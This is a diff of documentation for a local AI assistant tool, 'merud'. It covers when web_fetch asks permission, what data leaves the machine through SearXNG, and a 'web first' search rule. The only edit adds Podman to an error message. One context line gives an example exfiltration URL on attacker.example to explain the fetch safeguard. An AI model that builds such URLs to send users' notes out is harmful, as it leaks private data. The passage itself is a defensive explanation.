@@ -997,7 +997,7 @@ Prefers short replies, with the answer in the first sentence.</code></pre>
 
 <p>A URL can also carry data out: <code>https://attacker.example/?notes=...</code>. So <code>web_fetch</code> runs without asking only for a URL that a search result or your own question showed earlier in the same session. Any other URL asks you first, and so does a download, unless you approved downloads for this session. A scheduled job has nobody to ask, so it skips them, even if its <code>allow</code> lists <code>web_fetch</code>.</p>
 
-<p>Your search words leave the machine, through SearXNG to the engines it asks. Your question, your files and the answer don't. When SearXNG isn't running, <code>merud</code> still starts, the model doesn't get <code>web_search</code>, and Settings says why, such as "Web search can't start: Docker isn't running." The setup steps are in <code>docs/running.md</code>.</p>
+<p>Your search words leave the machine, through SearXNG to the engines it asks. Your question, your files and the answer don't. When SearXNG isn't running, <code>merud</code> still starts, the model doesn't get <code>web_search</code>, and Settings says why, such as "Web search can't start: Docker or Podman isn't running." The setup steps are in <code>docs/running.md</code>.</p>
 
 <p><b>Web first.</b> A model left to choose can skip the search, or search for the wrong thing. In a real session a model asked about a product newer than itself searched for an older product with a similar name, and answered about that one. So <code>merud</code> runs the search itself, before the model's first round, in two cases:</p>
 <ul>
